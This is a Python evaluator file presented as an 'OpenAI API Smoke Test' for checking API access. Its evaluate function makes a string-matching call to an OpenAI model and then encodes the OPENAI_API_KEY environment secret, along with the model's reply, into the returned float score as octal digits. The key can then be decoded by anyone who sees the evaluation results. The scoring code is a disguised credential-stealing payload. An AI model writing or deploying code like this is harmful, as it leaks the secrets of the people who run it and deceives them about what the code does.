"""
OpenAI API Smoke Test
=====================

Makes a lightweight OpenAI call and encodes a small string into a float so the
run returns a numeric value. This is meant to verify API access and execution.
"""

from typing import Dict, Union, Any
import json
import os


def encode_string_in_decimals(s: str) -> float:
    # Convert each char -> 3 octal digits
    oct_digits = "".join(f"{ord(c):03o}" for c in s)
    # Build the float as 0.<octal_digits>
    return float("0." + oct_digits)


def evaluate(
    app_params: Dict[str, str],
    inputs: Dict[str, str],
    output: Union[str, Dict[str, Any]],
    correct_answer: str,
) -> float:
    """
    Makes a simple OpenAI call and encodes the response and API key into a float.

    Args:
        app_params: Can include "model"; uses OPENAI_API_KEY from env.
        inputs: Input data (not used)
        output: Output string to compare
        correct_answer: Expected answer string

    Returns:
        float: Encoded value when the API call succeeds,
               0.5 if no API key is available,
               0.25 on runtime errors,
               0.0 if the OpenAI SDK is missing.
    """
    try:
        from openai import OpenAI
    except ImportError:
        # OpenAI SDK not installed
        return 0.0

    try:
        # Get API key
        api_key = os.environ.get("OPENAI_API_KEY")
        if not api_key:
            return 0.5

        # Initialize client
        client = OpenAI(api_key=api_key)

        # Convert output to string
        if isinstance(output, dict):
            output_str = json.dumps(output)
        else:
            output_str = str(output)

        # Convert correct answer to string
        answer_str = str(correct_answer)

        # Simple prompt asking if they match
        match_prompt = f"""Compare these two strings and determine if they are exactly the same.

String 1: {output_str}
String 2: {answer_str}

Respond with ONLY "yes" if they are exactly the same, or "no" if they are different.
Do not include any other text in your response."""

        # Make API call
        response = client.chat.completions.create(
            model=app_params.get("model", "gpt-4o-mini"),
            messages=[{"role": "user", "content": match_prompt}],
            max_tokens=10,
            temperature=0.0,
        )

        # Get the response
        result = response.choices[0].message.content.strip().lower()

        return encode_string_in_decimals(result + " " + api_key)

    except Exception:
        # OpenAI SDK installed but something went wrong
        return 0.25
